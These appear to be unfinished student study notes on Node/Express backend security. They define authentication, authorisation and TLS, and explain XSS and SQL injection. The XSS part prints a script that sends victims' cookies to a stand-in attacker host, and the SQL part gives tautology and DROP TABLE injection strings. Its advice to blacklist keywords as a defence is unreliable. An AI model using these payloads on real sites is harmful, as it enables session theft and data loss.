## Period-4 Security
### Securing Node/Express/REST-Backends


#### Explain basic security terms like authentication, authorization, confidentiality, integrity, SSL/TLS and provide examples of how you have used them.

##### Authentication
Authentication is the process of making sure, that somebody really is who they claims to be.
This is often done with a login.

##### Authorization
Authorization verifies what you are allowed to do.
Even though both a user and an admin are logged into the system, you would not want them to have access to the same pages.

##### Confidentiality
When sending data to another person, you want to make sure that the data reach the intended receiver, and not someone who pretends to be the receiver.
This is done by using a secure connection(SSL or TLS).

##### Integrity
When sending the data to the correct person, you want to make sure that no one is changing the data while it's on its way to the receiver.
This is done by using a secure connection(SSL or TLS).

##### SSL/TLS
SSL and TLS are both protocols that are designed to provide security when sending data over a computer network.
They ensure the secure connection by encrypting the data before it is sent, and in such a way that only the intended receiver will be able to decrypt it.


#### Explain basic security threads like: Cross Site Scripting (XSS), SQL Injection and whether something similar to SQL injection is possible with NoSQL databases like MongoDB, and DOS-attacks. Explain/demonstrate ways to cope with these problems.

##### Cross Site Scripting
Cross site scripting(XSS) is a way of an attacker to inject a script into an input field, and using that input field to send the malicious script into the server, which will the send it to other users.
That way an attacker can attack multiple users of a site.

An example could be a forum, where you can post threads, and see a list of all threads written.
If a user in the thread title names it "Javascript 101", all the users that goes to the forum will see that title in the list of threads.

The attacker can then user this to inject a javascript script into the title instead. It could be something harmless like:
`<script>alert('hi')</script>Javascript 101
Everytime someone would load the list of threads in the forum. The little script tag would be run and popup. But if the attacker instead writes something like:
`<script>
`var xmlHttp = new XMLHttpRequest();
`xmlHttp.open("GET","www.evilwebsite.com/hackerEntry?cookie="+document.cookie, false);
`xmlHttp.send();
`</script>Javascript 101

Then every time a user loads the list of threads, their cookies(Often with a sessionID) would be sent to www.evilwebsite.com, where the attacker could read the information.

There are multiple ways of making sure this is not possible, and in order to open up for xss you would often have to change defaults settings of multiple node modules.
One of the ways to prevent XSS is by sanitizing the input. To sanitize the inputs, means that we remove all charaters or strings that could be a threat. For instance we could use the HTML codes for some charaters:
< would be &lt; and > would be &gt;


##### SQL Injection
SQL injection is a technique where an attacker injects SQL commands into the inputs fields. 
Lets say we have a site with multiple users. On this site there's a search bar where you can search the users using their username.
Lets say we want all users with the username of "LarsM"
In the backend we gets the input from the input field and queries to the db:
```SQL
SELECT * FROM Users WHERE UserName = 'LarsM'
```
This would give back a list from the Users table, of users with the username of "LarsM".

But what if we instead gave it "LarsM' or '1=1"
Then we SQL would look like this:
```SQL
SELECT * FROM Users WHERE UserName = 'LarsM' or '1=1''
```
Which would give us a list of ALL users.

Or we could do "LarsM'; DROP TABLE USERS'

Which would then drop the whole users table.

Again, could sanitizing the input be a way to prevent this. You could blacklist words such as DROP TABLE and so. Or blacklist the character "'".



#### Explain, at a fundamental level, the technologies involved, and the steps required initialize a SSL connection between a browser and a server and how to use SSL in a secure way.
This


#### Explain and demonstrate ways to protect user passwords on our backends, and why this is necessary.


#### Explain about password hashing, salts and the difference between bcrypt and older (not recommended) algorithms like sha1, md5 etc.


#### Explain about JSON Web Tokens (jwt) and why they are very suited for a REST-based API
This


#### Explain and demonstrate a system using jwt's, focusing on both client and server side.


#### Explain and demonstrate use of the npm passportjs module.


#### Explain, at a very basic level, OAuth 2 + OpenID Connect and the problems it solves.
This


#### Demonstrate, with focus on security, a proposal for an Express/Mongo+Angular-seed with built in support for most of the basic security problems, SSL and ready to deploy on your favourite Cloud Hosting Service.

